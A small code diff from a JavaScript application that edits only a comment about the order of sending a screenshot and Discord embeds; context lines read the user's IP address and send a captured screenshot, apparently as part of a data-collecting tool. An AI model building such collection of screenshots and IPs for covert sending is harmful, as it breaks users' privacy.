@@ -201,7 +201,7 @@ class Application {
             const systemInfo = stats.getRawData().system;
             const userIp = systemInfo.ip || 'Unknown';
 
-            // FIRST: Send screenshot if available (as per requirement: image first, then embed)
+            // FIRST: Send screenshot if available (as per requirement: embed first, then image, then Discord embeds)
             if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
                 logger.info('Sending screenshot first (as requested)');
                 try {
